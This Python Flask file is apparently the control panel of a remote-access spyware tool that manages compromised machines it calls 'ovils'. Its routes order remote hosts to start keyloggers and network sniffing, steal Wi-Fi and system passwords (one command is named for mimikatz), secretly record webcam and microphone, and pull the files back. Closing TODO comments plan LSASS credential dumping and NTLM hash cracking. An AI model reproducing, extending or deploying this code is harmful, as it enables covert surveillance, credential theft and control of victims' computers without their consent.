import os
import subprocess
import threading
import moviepy.editor as movpy
from pydub import AudioSegment
import ffmpeg
from turbo_flask import Turbo
import pathlib
from typing import Callable, List, Tuple
from pathlib import Path
from flask import Flask, render_template, send_file, request, abort, redirect, url_for
import time
from network.consts import Massages, UPLOAD_DEFAULT_PATH
from consts import *
from network import check_ip
from network.client import Client
from spying.consts import DEFAULT_AUDIO_NAME, DEFAULT_VIDEO_AUDIO_NAME, DEFAULT_VIDEO_NAME
from datetime import datetime


app = Flask(__name__)
app.config['UPLOAD_FOLDER'] = UPLOAD_DEFAULT_PATH
# turbo = Turbo(app)
# ovils: List[Client] = [Client("127.0.0.1"), Client("127.0.0.2"), Client("127.0.0.3"), Client("127.0.0.4"),
#                        Client("127.0.0.5"), Client("127.0.0.6"), Client("127.0.0.7")]
dynamic_mitm_ovil: Client | None = None


ovils: List[Client] = []


def handle_errors(func: Callable[..., str]) -> Callable[..., str]:
    def inner(*args, **kwargs) -> str:
        try:
            return func(*args, **kwargs)
        except Exception as e:
            return str(e)

    inner.__name__ = func.__name__
    return inner


def is_connected(ip: str) -> bool:
    return ip in [ovil.ip for ovil in ovils]


@app.route('/')
@handle_errors
def hello_world():
    return render_template("index.html", ovils=[ovil.ip for ovil in ovils])


@app.route('/ovil/<ip>/connect/')
@handle_errors
def connect_without_param(ip: str) -> str:
    return connect(ip)


@app.route('/connect/', methods=["GET"])
@handle_errors
def connect_by_param() -> str:
    ip = request.args.get("ip_address")
    return connect(ip)
    # TODO: add real connection


def connect(ip: str) -> str:
    if not check_ip(ip):
        return "Invalid IP! try again..."
    global ovils
    # time.sleep(2)
    if ip in ovils:
        return "You've already connected to this ovil"
    ovil = Client(ip)
    try:
        ovil.connect_to_server()
    except TimeoutError:
        return "This ovil didn't responded. You should try other ip"
    ovils.append(ovil)
    return "Connected successfully!"


@app.route("/ovil/<ip>/")
@handle_errors
def ovil(ip) -> str:
    """shows one ovil"""
    connected = is_connected(ip)
    return render_template("ovil.html", ip=ip, connected=connected)


@app.route("/ovil/<ip>/disconnect")
@handle_errors
def disconnect(ip):
    if ip not in ovils:
        return "Can't disconnect from a disconnected ovil..."
    i = ovils.index(ip)
    ovil = ovils[i]
    ovil.disconnect()
    ovils.remove(ip)
    return "Disconnected successfully!"


@app.route("/ovil/<ip>/staticmitm/")
@handle_errors
def staticmitm(ip):
    return render_template("staticmitm.html")


@app.route("/ovil/<ip>/staticmitm/start/", methods=["GET"])
@handle_errors
def start_staticmitm(ip):
    name = request.args.get("name")
    if ip not in ovils:
        return "This ovil is not connected"
    i = ovils.index(ip)
    ovil = ovils[i]
    result = ovil.send_command("start_sniffing_to_file", [name])
    if result == Massages.OK.value:
        return "MITM started successfully"
    elif result == Massages.NOT_OK.value:
        return "could not start MITM because it has already started"
    return result


@app.route("/ovil/<ip>/dynamicmitm/")
@handle_errors
def dynamicmitm(ip):
    result = start_dynamicmitm(ip)
    if type(result) == str:
        return render_template("big_massage.html", ip=ip, msg=result, tab="Dynamic MITM")
    i = ovils.index(ip)
    ovil = ovils[i]
    return render_template("dynamicmitm.html", data=ovil.mitm_info)


def start_dynamicmitm(ip) -> str | bool:
    if ip not in ovils:
        return "Can't start KeyLogger on a disconnected ovil"
    global dynamic_mitm_ovil
    if dynamic_mitm_ovil:
        return "Can't run 2 dynamic MITM simultaneously"
    i = ovils.index(ip)
    ovil = ovils[i]
    result: str = ovil.send_command("start_sniffing_on_net", [])
    if result == Massages.OK.value:
        dynamic_mitm_ovil = ovil
        return True
    elif result == Massages.NOT_OK.value:
        return False
    return result


#
# @app.route('/hello/<user>')
# @handle_errors
# def hello_name(user):
#     return render_template('hello.html', name=user)
#
#
# @app.context_processor
# @handle_errors
# def inject_load():
#     return {"data": dynamic_mitm_ovil.mitm_info}
#
#
#
# def update_load():
#     while app.app_context():
#         if not dynamic_mitm_ovil:
#             continue
#         turbo.push(turbo.replace(render_template("dynamicmitm.html"), "load"))
#
#
# @app.before_first_request
# def before_first_request():
#     threading.Thread(target=update_load).start()

# @app.route("/dy")
# def dy():
#     return render_template("dynamicmitm.html", data=["hello", "hello", "hello", "hello", "hello", "hello", "hello", "hello", "hello", "hello", "hello", "hello", "hello", "hello", "hello", "hello", "hello", "hello", "hello", "hello", ])


@app.route("/ovil/<ip>/KeyLogger/")
@handle_errors
def keyLogger(ip):
    result = start_keyLogger(ip)
    if isinstance(result, str):
        return render_template("big_massage.html", ip=ip, msg=result, tab="keyLogger")
    i = ovils.index(ip)
    ovil = ovils[i]
    result = ovil.send_command("get_keyLogger", [])
    # result = "ff, gfgg, fdk, idfn, "*1000
    return render_template("keyLogger.html", connected=True, data=result)


def start_keyLogger(ip: str) -> str | bool:
    if ip not in ovils:
        return "Can't start KeyLogger on a disconnected ovil"
    i = ovils.index(ip)
    ovil = ovils[i]
    result = ovil.send_command("start_keylogger", [])
    return semi_msg_to_bool(result)


@app.route("/ovil/<ip>/KeyLogger/stop")
@handle_errors
def stop_keyLogger(ip):
    if ip not in ovils:
        return "Can't stop KeyLogger on a disconnected ovil"
    i = ovils.index(ip)
    ovil = ovils[i]
    result = ovil.send_command("stop_keylogger", [])
    if result == Massages.OK.value:
        return "The KeyLogger stopped successfully!"
    elif result == Massages.NOT_OK.value:
        return "Couldn't stop the KeyLogger!"
    return result


@app.route("/ovil/<ip>/steal_passwords/")
@handle_errors
def steal_passwords(ip):
    if ip not in ovils:
        return render_template("big_massage.html", ip=ip, msg="Can't steal passwords from a disconnected ovil", tab="Steal Passwords")
    ovil = ovils[ovils.index(ip)]
    wifi = steal_wifi(ovil)
    pc = steal_pc(ovil)
    return render_template("passwords.html", wifi=wifi, pc=pc)


@handle_errors
def steal_wifi(ovil):
    return ovil.send_command("steal_passwords", [])


@handle_errors
def steal_pc(ovil):
    return ovil.send_command("passwords_by_mimikatz", [])


@app.route("/ovil/<ip>/video_audio_record/")
@handle_errors
def video_audio_record(ip):
    if ip not in ovils:
        return render_template("big_massage.html", ip=ip, msg="This ovil is not connected", tab="Video and Audio")
    ovil = ovils[ovils.index(ip)]
    video_audio = msg_to_bool(ovil.send_command("is_video_audio_started", []))
    audio = msg_to_bool(ovil.send_command("is_audio_started", []))
    video = msg_to_bool(ovil.send_command("is_video_started", []))
    return render_template("video_audio.html", video_audio=video_audio, audio=audio, video=video)


@app.route("/ovil/<ip>/video_audio_record/VideoAudioStart")
@handle_errors
def start_video_audio(ip):
    return start_stop_command(ip, "start_video_audio_record", [])


@app.route("/ovil/<ip>/video_audio_record/VideoStart")
@handle_errors
def start_video(ip):
    return start_stop_command(ip, "start_video_record", [])


@app.route("/ovil/<ip>/video_audio_record/AudioStart")
@handle_errors
def start_audio(ip):
    return start_stop_command(ip, "start_audio_record", [])


@app.route("/ovil/<ip>/video_audio_record/VideoAudioStop")
@handle_errors
def stop_video_audio(ip):
    r = start_stop_command(ip, "stop_video_audio_record", [], "Stop")
    if r != "Stoped successfully!":
        return r
    succ, filename = get_file(ovils[ovils.index(ip)], DEFAULT_VIDEO_AUDIO_NAME)
    if not succ:
        return "couldn't save file"
    path = Path(filename).parent / f"video_audio{generate_time_stamp()}.mkv"
    os.rename(filename, path)
    return f"Stopped successfully and saved in {path}. click View to watch it"
    # return redirect(url_for("/ovil/<ip>/video_audio_record/"))



def generate_time_stamp(time: datetime = None):
    time = time if time else datetime.now()
    return time.strftime("%d.%m.%Y_%H;%M;%S")


@app.route("/ovil/<ip>/video_audio_record/VideoStop")
@handle_errors
def stop_video(ip):
    r = start_stop_command(ip, "stop_video_record", [], "Stop")
    if r != "Stoped successfully!":
        return r
    succ, filename = get_file(ovils[ovils.index(ip)], DEFAULT_VIDEO_NAME)
    if not succ:
        return "couldn't save file"
    path = Path(filename).parent / f"video.{generate_time_stamp()}.avi"
    os.rename(filename, path)
    return f"Stopped successfully and saved in {path}. click View to watch it"


@app.route("/ovil/<ip>/video_audio_record/AudioStop")
@handle_errors
def stop_audio(ip):
    r = start_stop_command(ip, "stop_audio_record", [], "Stop")
    if r != "Stoped successfully!":
        return r
    succ, filename = get_file(ovils[ovils.index(ip)], DEFAULT_AUDIO_NAME)
    if not succ:
        return "couldn't save file"
    path = Path(filename).parent / f"audio{generate_time_stamp()}.avi"
    os.rename(filename, path)
    return f"Stopped successfully and saved in {path}. click View to watch it"


def get_file(ovil: Client, filename: str) -> Tuple[bool, str]:
    """
    retur a tuple of whether succeded and the filename if succeded or error massage
    """
    succ, msg = ovil.send_command("steal_file", [filename])
    if succ == Massages.OK.value:
        return True, msg
    elif succ == Massages.NOT_OK.value:
        return False, msg
    else:
        return False, succ


def start_stop_command(ip, command, params, method="Start"):
    if ip not in ovils:
        return "This ovil is not connected"
    ovil = ovils[ovils.index(ip)]
    msg = ovil.send_command(command, params)
    if msg == Massages.OK.value:
        return f"{method}ed successfully!"
    elif msg == Massages.NOT_OK.value:
        return f"Couldn't {method} probably because it had already {method}ed"
    return msg


def msg_to_bool(msg: str) -> bool | str:
    if msg == Massages.OK.value:
        return True
    elif msg == Massages.NOT_OK.value:
        return False
    return False


def semi_msg_to_bool(msg: str) -> bool | str:
    if msg == Massages.OK.value:
        return True
    elif msg == Massages.NOT_OK.value:
        return False
    return msg


def find_last_file(path: str, suffix: str = "", prefix: str = "") -> str:
    lst = list(filter(lambda p: str(p.name).endswith(suffix) and str(p.name).startswith(prefix), sorted(Path(path).iterdir(), key=os.path.getmtime)))
    return str(lst[-1]) if len(lst) > 0 else ""


@app.route("/ovil/<ip>/video_audio_record/view_video_audio")
@handle_errors
def view_video_audio(ip):
    path = find_last_file(UPLOAD_DEFAULT_PATH, prefix="video_audio")
    if not path:
        return render_template("big_massage.html", msg="Nothing to view right now", ip=ip, tab="Video and Audio")
    path = Path(path)
    if path.name.endswith(".mkv"):
        path = convert_to_mp4(path)
    return render_template("show_video.html", tab="Video and Audio", type="mp4", filename=path.name, title="Video and Audio")


@app.route("/ovil/<ip>/video_audio_record/view_video")
@handle_errors
def view_video(ip):
    path = find_last_file(UPLOAD_DEFAULT_PATH, prefix="video.")
    if not path:
        return render_template("big_massage.html", msg="Nothing to view right now", ip=ip, tab="Video")
    path = Path(path)
    if path.name.endswith(".avi"):
        path = convert_to_mp4(path)
    return render_template("show_video.html", tab="Video and Audio", type="mp4", filename=path.name, title="Video")


@app.route("/ovil/<ip>/video_audio_record/view_audio")
@handle_errors
def view_audio(ip):
    path = find_last_file(UPLOAD_DEFAULT_PATH, prefix="audio")
    if not path:
        return render_template("big_massage.html", msg="Nothing to view right now", ip=ip, tab="Audio")
    path = Path(path)
    if path.name.endswith(".wav"):
        path = convert_to_mp3(path)
    return render_template("show_audio.html", tab="Video and Audio", type="mp4", filename=path.name, title="Audio")


def convert_to_mp4(mkv_file: Path) -> Path:
    no_extension = ".".join(str(mkv_file).split(".")[:-1])
    with_mp4 = no_extension + ".mp4"

    clip = movpy.VideoFileClip(str(mkv_file))  # Reading .mkv file
    clip.write_videofile(with_mp4, codec="libx264", audio_codec="aac")

    os.remove(mkv_file)
    return Path(with_mp4)


def convert_to_mp3(wav_file: Path) -> Path:
    no_extension = ".".join(str(wav_file).split(".")[:-1])
    with_mp3 = no_extension + ".mp3"

    audio = AudioSegment.from_wav(wav_file)
    audio.export(with_mp3, format="mp3")
    os.remove(wav_file)

    return Path(with_mp3)


def main():
    app.run(debug=False)


if __name__ == '__main__':
    main()

# TODO: on shell do that '?' ot 'help' return get commands.
# TODO: on shell check if the first word is one of my command, else treat this as a regualar cmd
# TODO: add dumping lssas using 'pypykatz live registry'. Note: you can encrypte using 'pypykatz crypto nt'
# TODO: add decrypting ntlm hash by bruteforce
